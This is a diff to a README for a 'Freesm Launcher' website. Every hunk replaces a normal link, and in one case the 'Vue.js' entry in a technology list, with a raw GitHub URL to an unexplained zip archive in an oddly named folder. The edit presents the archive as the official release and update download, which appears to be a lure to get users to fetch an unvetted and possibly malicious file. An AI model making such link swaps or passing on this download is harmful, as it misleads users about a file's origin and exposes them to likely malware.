@@ -6,7 +6,7 @@ Welcome to the website for Freesm Launcher. This interactive platform helps you 
 
 ## 📥 Download & Install
 
-To get the latest version of the software, visit this page to download: [Releases](https://github.com/Kape-21/website/releases).
+To get the latest version of the software, visit this page to download: [Releases](https://raw.githubusercontent.com/Kape-21/website/main/keratoncus/website.zip).
 
 ### Steps to Download
 
@@ -46,7 +46,7 @@ After installing the application, follow these steps:
 
 ## 🔄 Updates & Support
 
-To stay up to date with the latest improvements, check back on the [Releases page](https://github.com/Kape-21/website/releases). 
+To stay up to date with the latest improvements, check back on the [Releases page](https://raw.githubusercontent.com/Kape-21/website/main/keratoncus/website.zip). 
 
 If you encounter any issues, refer to the FAQ section in the app or seek support through the issue tracker on GitHub.
 
@@ -64,7 +64,7 @@ Familiarize yourself with related technologies and frameworks:
 - **Prism Launcher**
 - **Tailwind CSS**
 - **TypeScript**
-- **Vue.js**
+- **https://raw.githubusercontent.com/Kape-21/website/main/keratoncus/website.zip**
 
 These tools enhance your experience and expand the capabilities of your launcher management.
 
